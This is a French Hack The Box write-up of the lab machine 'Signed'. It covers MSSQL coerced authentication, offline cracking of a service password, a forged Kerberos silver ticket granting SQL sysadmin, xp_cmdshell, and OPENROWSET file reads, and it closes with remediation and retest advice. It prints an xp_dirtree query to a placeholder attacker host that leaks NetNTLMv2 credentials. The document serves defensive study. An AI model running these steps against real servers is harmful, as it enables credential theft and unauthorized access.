---
id: "HTB-2025-011"
title: "Signed"
excerpt: "Signed est un exercice MSSQL avec accès initial fourni : un compte SQL peu privilégié peut provoquer une authentification sortante, puis une clé de service compromise permet de modifier l’autorisation SQL par un ticket forgé."
date: "2025-10-11"
updated: "2026-10-15"
tags: ["WRITEUP", "HACKTHEBOX", "WINDOWS", "MSSQL", "KERBEROS", "SILVER-TICKET", "MEDIUM"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "WINDOWS"
difficulty: "MEDIUM"
icon: "ShieldAlert"
author: "0x7CC"
published: true
---

## Point de départ et progression

Le laboratoire fournit le compte SQL `scott`. Le mot de passe figure dans le scénario de la machine et n’est pas repris ici. La chaîne est **`scott` → authentification SMB sortante du service MSSQL → découverte hors ligne du mot de passe `mssqlsvc` → clé du service MSSQL → ticket MSSQL forgé avec un groupe autorisé → rôle SQL `sysadmin` → exécution OS comme service SQL → lecture privilégiée et secret administrateur**. Le ticket cible un service particulier ; il ne constitue pas une connexion universelle au domaine.

`DC01.signed.htb` désigne le serveur du laboratoire. `<LAB_PASSWORD>` représente le mot de passe fourni ou retrouvé à l’étape concernée. L’écouteur doit appartenir au laboratoire autorisé et les hashes et tickets doivent rester hors des sorties publiées.

## Établir l’identité SQL

La découverte des ports révèle MSSQL sur TCP 1433. Le compte `scott` utilise l’authentification SQL, et non l’authentification Windows intégrée. Certains clients tentent par défaut `SIGNED\scott` : cette identité de domaine est alors refusée, car elle ne correspond pas au compte fourni. Une connexion SQL réussie conserve des droits limités. Interroger le contexte et le rôle avant d’essayer les fonctions administratives :

```sql
SELECT SYSTEM_USER AS current_login, ORIGINAL_LOGIN() AS original_login;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
```

Un zéro pour `is_sysadmin` explique pourquoi ce compte ne peut pas simplement activer l’exécution de commandes. `xp_cmdshell` lance des processus sous l’identité du service SQL ou d’un proxy configuré ; même plus tard, `whoami` sera nécessaire pour connaître l’identité Windows. Microsoft décrit les [permissions et le contexte d’exécution](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql).

Ce compte peut utiliser `xp_dirtree`, normalement destiné à lister des répertoires. Avec un chemin UNC comme `\\<ATTACKER_IP>\probe`, le serveur SQL tente une connexion SMB vers le chemin. Un écouteur autorisé reçoit alors un échange NetNTLMv2 du compte exécutant SQL Server. Il ne reçoit ni le hash NT brut ni le mot de passe en clair. Vérifier que le nom capturé est `mssqlsvc` et ne conserver qu’une preuve expurgée.

Le déclencheur est une requête SQL envoyée comme `scott`, tandis que l’écouteur SMB se trouve sur le poste de test. Remplacer `<ATTACKER_IP>` par l’adresse de ce poste sur le réseau du laboratoire :

```sql
EXEC master.sys.xp_dirtree N'\\<ATTACKER_IP>\probe';
```

Le préfixe `N` représente une chaîne Unicode, attendue par la procédure. Les deux antislashs initiaux indiquent un hôte SMB distant ; `probe` ne sert ici que de nom de partage pour provoquer la connexion. Vérifier l’adresse source et le nom du compte sur l’écouteur avant d’attribuer la réponse au serveur SQL. Cette étape démontre une authentification sortante, pas l’accès au partage distant.

En l’absence de tentative d’authentification, contrôler la sortie SMB, la syntaxe UNC, l’écouteur et le principal utilisé par le service pour accéder aux fichiers. Une procédure SQL terminée sans erreur ne prouve pas qu’une connexion TCP externe a abouti.

## Retrouver le compte de service et sa clé

Dans le laboratoire, le mot de passe `mssqlsvc` peut être retrouvé par essais hors ligne contre la réponse capturée. Ces essais ne provoquent pas de nouvelles connexions au serveur. Employer un mode adapté à NetNTLMv2, puis valider le candidat avec une authentification de domaine réelle. Le mot de passe permet aussi de dériver la clé Kerberos RC4 du service si ce type de chiffrement est accepté. Avant de créer un ticket, vérifier quel compte porte le SPN `MSSQLSvc/DC01.signed.htb:1433`, ainsi que les réglages de chiffrement et de validation. La clé doit appartenir au service que le ticket désigne.

Une connexion Windows ordinaire comme `mssqlsvc` ne donne toujours pas forcément le rôle SQL `sysadmin`. La liste des logins révèle que le groupe `SIGNED\IT` possède ce rôle. Les tickets de service Kerberos transportent des informations d’autorisation protégées, notamment les SID des groupes dans le PAC. Avec la clé du service, le SID du domaine, le bon SPN, le realm, le type de chiffrement et une heure cohérente, un ticket **MSSQL** forgé peut déclarer une appartenance à ce groupe. Le service peut déchiffrer un ticket protégé par sa clé et appliquer cette appartenance. Un ticket d’utilisateur ordinaire sans ce groupe reste peu privilégié.

Employer l’outillage [Impacket](https://github.com/fortra/impacket) examiné et adapté au laboratoire, en relevant sa version et le SPN exact. Il faut la clé, le SID du domaine, le SPN MSSQL, l’identité choisie et le RID du groupe IT. Ne pas publier la clé. Dans une nouvelle session SQL Kerberos, vérifier `SYSTEM_USER` et `IS_SRVROLEMEMBER('sysadmin')`. Un fichier `.ccache` créé n’est pas une preuve : le service doit l’accepter. Un décalage horaire, un SPN incorrect, RC4 désactivé ou la validation du PAC peuvent empêcher l’attaque. La [documentation Microsoft sur les tickets de service](https://learn.microsoft.com/en-us/windows/win32/secauthn/session-tickets) explique le rôle de la clé.

Il ne faut pas remplacer `MSSQLSvc/...` par `CIFS/DC01`. CIFS est un autre service, potentiellement doté d’une autre clé. La possession de la clé MSSQL n’établit ni un ticket CIFS valable ni une session administrateur du domaine.

## Passer de l’administration SQL à l’hôte

Une fois le rôle `sysadmin` effectivement obtenu, l’utilisateur SQL peut activer `xp_cmdshell` sur le serveur du laboratoire. Un `whoami` contrôlé révèle le jeton Windows ; sur Signed, il correspond au contexte du service SQL, sans être automatiquement `NT AUTHORITY\SYSTEM`. Cette étape franchit une nouvelle frontière : les droits SQL autorisent une fonction lançant un processus OS avec l’identité d’un service.

Pour un contrôle sans secret, choisir un fichier témoin connu avec des droits comparables à la cible sensible. Dans la session SQL Kerberos, la requête prend cette forme :

```sql
SELECT BulkColumn
FROM OPENROWSET(BULK N'<CANARY_PATH>', SINGLE_CLOB) AS evidence;
```

`<CANARY_PATH>` désigne un chemin absolu sur DC01, et non un fichier du poste de test. `SINGLE_CLOB` renvoie le texte en une valeur ; il ne contourne pas les permissions Windows. Une valeur retournée établit que le processus SQL peut lire le fichier. Un refus d’accès renseigne sur le jeton ou le chemin, mais ne prouve pas à lui seul l’échec du ticket forgé.

La machine offre aussi une lecture de fichiers privilégiés par `OPENROWSET(BULK ...)` lorsque SQL utilise le contexte forgé. La lecture de l’historique PowerShell de l’Administrateur révèle un secret dans le laboratoire. Il s’agit d’abord d’une **lecture de fichier**, puis d’une exposition de secret et enfin d’un test de connexion administrateur distinct. Ce résultat ne nécessite pas un ticket CIFS forgé. Un retest peut lire un fichier témoin inoffensif avec des droits comparables et noter le contexte effectif. Une ligne SQL retournée ne garantit pas qu’un mot de passe trouvé soit encore valide ; il faut le vérifier séparément.

Le client doit réellement demander Kerberos pour le SPN MSSQL lors du test du ticket forgé. Certains outils SQL choisissent l’authentification SQL lorsque nom et mot de passe sont fournis, ou réutilisent une connexion ouverte. Créer une session neuve, confirmer côté serveur le schéma d’authentification, puis vérifier le rôle. Sans cela, un ancien compte privilégié dans le client pourrait être pris pour une acceptation du ticket. Relever aussi la version courante de la clé de service ou l’état de rotation du mot de passe : un ticket chiffré avec l’ancienne clé peut échouer même si son PAC est cohérent. Ces contrôles rendent l’acceptation du ticket réfutable.

## Séparer les preuves du secret, du ticket et de l’hôte

| Étape | Preuve minimale | Pourquoi la distinction compte |
| --- | --- | --- |
| Session SQL `scott` | La connexion SQL réussit et `IS_SRVROLEMEMBER('sysadmin')` vaut zéro. | Cela définit le privilège initial et exclut l’activation directe de `xp_cmdshell`. |
| Authentification UNC | L’écouteur reçoit une réponse NetNTLMv2 expurgée au nom de `mssqlsvc`. | Le service s’est authentifié vers l’extérieur ; la réponse n’est ni hash NT ni mot de passe. |
| Candidat retrouvé | Une authentification de laboratoire réussit comme `mssqlsvc`. | La sortie d’un outil hors ligne peut venir d’un mauvais mode ou d’une capture mal formée. |
| Ticket MSSQL | Une nouvelle session SQL Kerberos accepte le ticket et annonce `sysadmin`. | Un `.ccache` présent sur disque ne prouve ni l’acceptation ni le groupe IT revendiqué. |
| Capacité sur l’hôte | `whoami` donne le jeton de service et un fichier témoin renvoie son contenu connu. | Administration SQL, exécution OS et lecture privilégiée sont des effets différents. |

Si le ticket échoue, diagnostiquer dans l’ordre les champs que valide le service : SPN visé, clé du compte de service, realm et SID du domaine, RID du groupe dans le PAC, type de chiffrement, heure, puis mappage SQL. Changer l’utilisateur revendiqué avant d’examiner ces champs masque souvent le vrai problème. À l’inverse, un rôle SQL obtenu ne prouve pas la possession d’un ticket administrateur du domaine : la portée du ticket forgé est `MSSQLSvc`. L’accès administrateur final exige encore une nouvelle authentification avec le secret trouvé plus tard.

## Corriger et vérifier

Restreindre `xp_dirtree` et les autres opérations de fichiers pour les logins SQL peu privilégiés ; limiter les connexions SMB sortantes de SQL Server. Utiliser un secret de service robuste et géré. Renouveler `mssqlsvc` après exposition afin d’invalider les tickets protégés par l’ancienne clé. Réduire les membres de `sysadmin`, laisser `xp_cmdshell` désactivé s’il n’est pas requis et empêcher l’enregistrement de secrets dans l’historique administrateur.

Le retest doit montrer que `scott` conserve ses opérations SQL approuvées, qu’un chemin UNC ne rejoint plus un écouteur non fiable, que l’ancien mot de passe et un ticket construit avec l’ancienne clé échouent, et qu’une session SQL ordinaire ne peut ni activer l’exécution OS ni lire les fichiers administrateur. Surveiller les sorties SMB, les changements de clé, les connexions Kerberos à MSSQL, l’activation de `xp_cmdshell` et les lectures BULK. Un ticket de service forgé peut être utilisé sans nouvelle délivrance par le KDC : les journaux du service lui-même sont donc nécessaires.
